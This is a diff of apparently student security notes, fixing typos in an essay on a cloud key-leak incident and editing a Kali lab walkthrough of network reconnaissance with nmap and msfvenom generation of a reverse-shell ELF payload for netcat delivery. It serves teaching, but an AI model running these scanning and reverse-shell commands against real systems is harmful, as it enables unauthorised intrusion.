@@ -12,7 +12,7 @@ Having addressed access distinctions, the separation of infrastructure is straig
 
 ### 02.a.2 How do roles and personnel fit into this, and which role could policies and training play?
 
-When looking into the roles that human agents played in this event we have to first point out the one that made the attak possible, and that's the operator in the corporate environment that likely fell victim to a phishing (or perhaps social engineering) attack which resulted in the corporate debugging repository access being leaked (and captured by Storm). Besides, we have the engineers who were woeking in the endpoint and assummed the helper cryptographic libraries to also validate scope of the issued tokens (probably some confusion between business logic and authorization as part of the system).
+When looking into the roles that human agents played in this event we have to first point out the one that made the attack possible, and that's the operator in the corporate environment that likely fell victim to a phishing (or perhaps social engineering) attack which resulted in the corporate debugging repository access being leaked (and captured by Storm). Besides, we have the engineers who were working in the endpoint and assummed the helper cryptographic libraries to also validate scope of the issued tokens (probably some confusion between business logic and authorization as part of the system).
 
 As for the roles, we must first address that of the policies. Firstly, policies must explicitly classify memory crash dumps and core dumps as containing sensitive memory, inspection which Microsoft states to have enforced since then; the latter should be paired with credential scanning before any file transitions as part of ingestion policies; ideally, Just In Time + Just Enough Access should be applied to all engineers that pretend to access any relevant data, though it is true that this introduces friction; finally log retention policies should prevent cases like this one, in which definitive proof that this engineer's account was the backdoor is nowhere to be found.
 
@@ -174,6 +174,8 @@ unix  3      [ ]         STREAM     CONNECTED     11029    /run/user/1000/at-spi
 unix  3      [ ]         STREAM     CONNECTED     6272     /run/systemd/journal/stdout
 unix  3      [ ]         STREAM     CONNECTED     15496    /run/dbus/system_bus_socket
 ...
+
+kali㉿kali$
 ```
 
 As we already know, a socket is a software structure that serves as an endpoint for sending and receiving data across the network. The bash code above shows always a specific type of socket, called **Unix Domain Socket**: they are not used for the communication via Internet but just for the communication between internal processes of the virtual machine.
@@ -194,6 +196,8 @@ unix  3      [ ]         STREAM     CONNECTED     10007
 unix  3      [ ]         STREAM     CONNECTED     9214     /run/user/1000/bus
 unix  3      [ ]         STREAM     CONNECTED     11387    /run/user/1000/bus
 ...
+
+kali㉿kali$
 ```
 
 Right now, we don't have anymore only software structures for the communication between internal processes, but also an **UDP** connection for the communication with an external server.
@@ -221,9 +225,11 @@ kali㉿kali$ ip address show
     inet6 fe80::7f3c:cb9f:84c8:fa4e/64 scope link noprefixroute 
        valid_lft forever preferred_lft forever
 ...
+
+kali㉿kali$
 ```
 
-We take in account the IP address `10.0.0.24` with its subnet mask, and finally we run `nmap` command: we should get the list of all the devices already connected to the same local network.
+We take in account the IP address `10.0.2.4` with its subnet mask, and finally we run `nmap` command: we should get the list of all the devices already connected to the same local network.
 
 ```bash
 kali㉿kali$ nmap -sP 10.0.2.4/24
@@ -240,6 +246,7 @@ MAC Address: 08:00:27:15:DA:61 (Oracle VirtualBox virtual NIC)
 Nmap scan report for 10.0.2.4
 Host is up.
 Nmap done: 256 IP addresses (4 hosts up) scanned in 3.14 seconds
+
 kali㉿kali$
 ```
 
@@ -360,6 +367,14 @@ In all of the cases, the `payload` is provided by the attacker. However, we have
 3. > -a x86 --platform linux f elf \
 4. > LHOST=10.0.2.24 LPORT=4444 \
 5. > -o payload.elf
+
+```bash
+kali㉿kali$ msfconsole
+```
+
+```bash
+msf > msfvenom
+```
 
 Once all these commands have been executed, in our current directory will be created a new file called `payload.elf`, which it will be transfered to the target machine through a `netcat` TCP connection.
 ```bash
